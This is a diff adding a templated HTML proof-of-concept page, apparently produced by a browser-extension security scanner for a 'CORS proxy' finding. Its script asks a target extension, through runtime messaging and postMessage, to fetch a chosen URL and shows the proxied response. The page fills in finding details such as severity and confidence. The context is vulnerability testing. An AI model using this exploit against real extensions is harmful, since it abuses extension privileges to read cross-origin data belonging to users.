@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PoC — CORS Proxy — {{ ext_id }}</title>
+<style>
+  body { font-family: monospace; max-width: 800px; margin: 40px auto;
+         background: #1a1a1a; color: #e0e0e0; padding: 20px; }
+  h2 { color: #ff6b6b; }
+  .meta { background: #2a2a2a; border-left: 3px solid #444;
+          padding: 12px; margin: 16px 0; }
+  pre { background: #0d0d0d; padding: 16px; overflow-x: auto;
+        border: 1px solid #333; border-radius: 4px; }
+  button { background: #ff6b6b; color: #fff; border: none;
+           padding: 10px 24px; cursor: pointer; font-size: 14px;
+           border-radius: 4px; margin-top: 16px; }
+  button:hover { background: #ff4444; }
+  #result { margin-top: 16px; background: #0d0d0d; padding: 16px;
+            border: 1px solid #333; border-radius: 4px;
+            min-height: 60px; white-space: pre-wrap; }
+  .tag { display: inline-block; padding: 2px 8px; border-radius: 3px;
+         font-size: 12px; background: #ff6b6b; color: #fff; }
+</style>
+</head>
+<body>
+<h2>PoC: CORS Proxy (Extension fetch proxy)</h2>
+<div class="meta">
+  <div><strong>Extension ID:</strong> <code>{{ ext_id }}</code></div>
+  <div><strong>Finding:</strong> {{ finding.title }}</div>
+  <div><strong>Severity:</strong>
+    <span class="tag">{{ finding.severity | upper }}</span></div>
+  <div><strong>Confidence:</strong>
+    {{ (finding.confidence * 100) | int }}%</div>
+  <div><strong>Generated:</strong> {{ generated_at }}</div>
+</div>
+
+<label>Target URL to proxy:</label>
+<input id="target-url" value="https://httpbin.org/get"
+       style="width:100%;padding:8px;background:#0d0d0d;
+              color:#e0e0e0;border:1px solid #444;margin:8px 0">
+
+<button id="launch">Launch Proxy Request</button>
+<div id="result">Click Launch Proxy Request...</div>
+
+<script>
+const EXT_ID = "{{ ext_id }}";
+document.getElementById('launch').onclick = function() {
+  var url = document.getElementById('target-url').value;
+  var result = document.getElementById('result');
+  result.textContent = 'Asking extension to fetch: ' + url;
+
+  if (typeof chrome !== 'undefined' && chrome.runtime) {
+    chrome.runtime.sendMessage(EXT_ID,
+      { type: 'fetch', url: url },
+      function(resp) {
+        result.textContent = resp
+          ? 'Extension proxied response:\n' + JSON.stringify(resp, null, 2)
+          : 'No response — may not be vulnerable to direct sendMessage.\n' +
+            'Try postMessage approach below.';
+      }
+    );
+  }
+
+  window.postMessage({ type: 'fetch', url: url }, '*');
+  window.addEventListener('message', function(e) {
+    if (e.data && e.data.data) {
+      result.textContent += '\n\npostMessage proxy response:\n' +
+        JSON.stringify(e.data, null, 2);
+    }
+  }, { once: true });
+};
+</script>
+</body>
+</html>
+
